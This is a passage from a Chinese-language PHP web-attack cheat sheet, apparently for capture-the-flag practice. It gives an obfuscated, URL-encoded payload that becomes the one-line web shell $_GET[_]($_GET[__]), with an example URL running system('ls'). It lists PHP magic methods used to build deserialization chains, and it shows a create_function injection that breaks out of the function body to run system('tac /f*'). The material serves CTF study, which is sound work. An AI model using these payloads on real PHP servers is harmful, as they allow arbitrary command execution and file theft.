%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B
```

```php
$_GET[_]($_GET[__])
```
这个代码将允许使用`GET`请求传参，把`_`的值作为函数名，把`__`的值作为函数的参数

比如下面的这个例子：

```php
UEL/?_=system&__=ls
```



---
# 十三. 反序列化

多类php构造pop链，一般将eval、flag等危险函数或关键字作为链尾

`__invoke()`:__invoke是对象被当做函数进行调用时就会触发，

`__toString()`:__ToString⽅法是当对象被当做字符串的时候会自动调用

`__set()`:__set是对不存在或者不可访问的变量进行赋值就会自动调用

`__call()`:__call是对不存在的方法或者不可访问的方法进行调用就自动调用



# 十四. PHP 拼接注入

```php
$a = $_GET['a'];
$b = $_GET['b'];
if(preg_match('/^[a-z0-9_]*$/isD',$a)){
    show_source(__FILE__);
}
else{
    $a('',$b);
}
```
针对上面的这种情况，要想进行绕过以执行web命令，需要先绕过白名单：

```php
\create_function('', ';}system(\'tac /f*\');/*')('', $b);
```

拼接后的结果为:
```sh
function anonymous() {
    ;}system('tac /f*');/*
}
```

即闭合了函数 create_function ，然后执行了 system 函数的内容，实现了 webshell

---